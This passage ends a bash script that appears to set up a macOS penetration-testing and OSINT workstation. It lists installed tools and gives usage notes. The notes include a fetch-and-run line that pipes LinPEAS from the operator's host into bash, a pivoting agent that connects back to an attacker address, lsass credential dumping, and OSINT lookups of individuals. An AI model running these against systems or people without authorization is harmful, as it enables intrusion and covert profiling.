  ├── reports/        → pentest / bug bounty reports
  ├── screenshots/    → evidence and findings
  ├── pcaps/          → packet captures
  ├── memory-dumps/   → volatility3 analysis targets
  ├── malware-samples/→ malware analysis (isolate in VM)
  └── osint/          → OSINT workspace
      ├── targets/    → target notes and scope
      ├── reports/    → OSINT investigation reports
      ├── dumps/      → data dumps
      ├── sherlock/   → username enumeration
      ├── holehe/     → email recon
      ├── maigret/    → deep username OSINT
      ├── spiderfoot/ → automated OSINT automation
      ├── phoneinfoga/→ phone number OSINT
      ├── h8mail/     → email breach hunter
      ├── theHarvester/ → domain/email/subdomain recon
      ├── recon-ng/   → modular recon framework
      ├── osintgram/  → Instagram OSINT
      └── ghunt/      → Google account OSINT

WHAT WAS INSTALLED:

  Core / Terminal         git, tmux, fzf, bat, ripgrep, neovim, asciinema, glow
  Recon / OSINT           nmap, masscan, amass, subfinder, httpx, nuclei, shodan,
                          theharvester, dnsrecon, fierce, exiftool, spiderfoot
  OSINT Specific          sherlock, holehe, maigret, phoneinfoga, h8mail,
                          osintgram, ghunt, recon-ng, maltego
  Web / Bug Bounty        ffuf, gobuster, feroxbuster, sqlmap, nikto, dalfox,
                          jwt_tool, tplmap, arjun, smuggler, corscanner, zaproxy,
                          XSStrike, LinkFinder, SecretFinder, crlfuzz, bxss
  Network                 Wireshark/tshark, bettercap, mtr, testssl, sslscan,
                          proxychains-ng, mitmproxy, netcat, socat
  Creds / Cracking        hashcat, john-jumbo, hydra, hcxtools, hcxdumptool
  AD / Windows / SMB      impacket, evil-winrm, kerbrute, BloodHound,
                          CrackMapExec, NetExec, certipy-ad, pypykatz,
                          Responder, mitm6, ldapdomaindump, coercer,
                          enum4linux-ng, smbmap, windapsearch
  Red Team / C2           Sliver C2, Metasploit, chisel, ligolo-ng, pwntools,
                          PEASS-ng (LinPEAS/WinPEAS), SharpCollection
  Reverse Engineering     Ghidra, radare2/Cutter, binwalk, pwndbg, ROPgadget,
                          YARA, capstone, unicorn, floss, capa
  Blue Team / DFIR        volatility3, Zeek, Suricata, chainsaw, hayabusa,
                          sigma, YARA-Rules, oletools, pdfid
  Cloud Security          awscli, azure-cli, Pacu, ScoutSuite, CloudFox,
                          ROADtools, TeamFiltration, s3scanner, enumerate-iam
  Wireless                aircrack-ng, hcxdumptool, bettercap
  GUI Apps                Burp Suite, Caido, Wireshark, Ghidra, Cutter,
                          BloodHound, Maltego, Proxyman, Docker, Obsidian

MANUAL / SPECIAL-CASE NOTES:

1. Mimikatz:
   Windows-only binary — keep it in a Windows VM.
   Use pypykatz on macOS for offline credential analysis:
     pypykatz lsa minidump lsass.dmp

2. Sliver C2:
   sudo sliver-server
   sliver
   Docs: https://sliver.sh

3. Volatility3:
   vol3 -f memory.dump windows.pslist
   vol3 -f memory.dump linux.bash

4. Sherlock (username OSINT):
   sherlock <username>
   sherlock <username> --output ~/pentester/osint/reports/

5. Holehe (email OSINT):
   holehe target@email.com

6. Maigret (deep username OSINT):
   maigret <username>

7. SpiderFoot (automated OSINT):
   spiderfoot -l 127.0.0.1:5001   (then open browser)

8. GHunt (Google OSINT):
   ghunt email target@gmail.com

9. PhoneInfoga:
   phoneinfoga scan -n "+1XXXXXXXXXX"

10. BloodHound:
    neo4j start
    bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC-IP> -c All

11. Ligolo-ng (pivoting):
    sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
    ./ligolo-agent -connect <attacker>:11601 -ignore-cert

12. LinPEAS / WinPEAS:
    pyserver  → curl <your-ip>:8000/linpeas.sh | bash

13. Shodan CLI:
    shodan init <API_KEY>

14. Ghidra:
    open /Applications/Ghidra.app  (requires OpenJDK 21)

FIRST-RUN CHECKLIST:
  □ source ~/.zshrc
  □ brew doctor
  □ shodan init <API_KEY>
  □ bw login
  □ sudo sliver-server
  □ vol3 --help
  □ sherlock --help
  □ which nmap ffuf nuclei subfinder httpx sqlmap rustscan

EOF
}

### ---------- main ----------
main() {
  require_macos
  install_xcode_clt
  install_homebrew
  ensure_shell_profile
  create_dirs
  brew_taps
  brew_update_upgrade
  install_formulae
  install_casks
  setup_pipx
  setup_rust
  setup_go_tools
  install_manual_tools
  clone_repos
  setup_gf_patterns
  setup_volatility3
  write_shell_config
  finalize_tools
  manual_notes
}

main "$@"
